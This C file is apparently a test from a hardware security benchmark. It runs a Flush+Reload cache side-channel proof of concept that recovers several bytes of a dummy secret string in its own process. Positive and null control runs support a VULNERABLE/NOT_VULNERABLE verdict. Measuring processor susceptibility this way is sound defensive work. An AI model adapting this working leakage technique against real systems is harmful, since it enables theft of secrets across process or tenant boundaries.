/**
 * flush-reload: cache side channel (Flush+Reload), multi-byte.
 *
 * A shared line is flushed from the cache, the victim architecturally accesses
 * a secret-dependent line, and the attacker reloads (times) every line to find
 * which one the victim brought back.  Unlike Spectre this needs no speculation:
 * it is a pure cache-occupancy side channel on a shared buffer.  Multi-byte:
 * the victim walks the secret string and each byte is recovered from the
 * reload argmax.  Eviction uses a dependent chase (cbo.inval when available).
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

/* Architectural victim: access the secret-indexed shared line. */
__attribute__((noinline))
static void victim_access(int idx) {
  volatile uint8_t t =
      probe_array[(uintptr_t)(uint8_t)secret_str[idx] * SC_PROBE_STRIDE];
  (void)t;
}

static int read_byte(int idx, const sc_geom_t *g, uint32_t tries,
                     uint32_t *score) {
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    sc_evict_capacity(g); /* Flush: evict all shared lines */
    sc_fence();
    victim_access(idx);   /* victim Reloads one line */
    sc_fence();
    sc_probe_array(probe_array, g, &atk, 0xfeed + t); /* Reload + time */
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

int main(void) {
  if (sc_time_selfcheck("flush-reload") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT flush-reload ERROR reason=evict\n");
    return 1;
  }
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();
  uint32_t R = SECURITY_ATTACK_ROUNDS;
  int expect = (uint8_t)secret_str[0];

  /* Positive control: architectural access must register after flush. */
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    victim_access(0);
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xa11ce + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[expect] >= R / 2;

  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[flush-reload] leaking %d bytes:\n", SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte(i, &g, R, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x got=0x%02x score=%u/%u %s\n",
           i, (uint8_t)secret_str[i], got, (unsigned)scores[i],
           (unsigned)R, ok ? "OK" : "miss");
  }

  /* Null arm: victim accesses a fixed line (0), so secret index stays cold. */
  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    victim_access(0);
    sc_fence();
    sc_probe_array(probe_array, &g, &atk, 0x51de + r);
    atk.rounds++;
    sc_evict_capacity(&g);
    sc_fence();
    volatile uint8_t t = probe_array[0];
    (void)t;
    sc_fence();
    sc_probe_array(probe_array, &g, &nul, 0x9e37 + r);
    nul.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  sc_result("flush-reload", &d, pos_ok, expect, R, &g);
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT flush-reload-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[flush-reload] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (multibit_ok || d.verdict == SC_VULNERABLE)
    printf("[flush-reload] VULNERABLE: Flush+Reload cache side channel works\n");
  else if (!pos_ok)
    printf("[flush-reload] INCONCLUSIVE: positive control failed\n");
  else
    printf("[flush-reload] NOT VULNERABLE or insufficient signal\n");
  return 0;
}